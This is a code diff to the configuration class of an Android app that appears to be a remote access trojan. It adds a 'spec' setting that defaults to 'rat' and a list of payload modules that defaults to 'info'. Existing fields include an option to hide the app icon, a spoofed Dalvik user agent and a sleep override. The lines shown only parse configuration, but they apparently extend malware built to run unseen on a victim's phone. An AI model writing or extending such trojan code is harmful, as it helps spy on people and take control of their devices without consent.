@@ -5,7 +5,9 @@ import android.content.SharedPreferences;
 import android.content.res.AssetManager;
 import android.util.Base64;
 
+import org.json.JSONArray;
 import org.json.JSONObject;
+import java.util.List;
 
 import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
@@ -23,6 +25,8 @@ final class Config {
     final String pin;
     final String userAgent;
     final int nativePort;
+    final String spec;
+    final List<String> modules;
     boolean hideIcon;
     long sleepOverrideMs;
 
@@ -40,6 +44,17 @@ final class Config {
         userAgent = json.optString("user_agent", "Dalvik/2.1.0 (Linux; U; Android)");
         nativePort = json.optInt("native_port", 0);
         hideIcon = json.optBoolean("hide_icon", false);
+        spec = json.optString("spec", "rat");
+        JSONArray list = json.optJSONArray("modules");
+        List<String> names = new java.util.ArrayList<String>();
+        if (list != null) {
+            for (int i = 0; i < list.length(); i++) {
+                names.add(list.optString(i, ""));
+            }
+        } else {
+            names.add("info");
+        }
+        modules = names;
     }
 
     private static volatile Config cached;
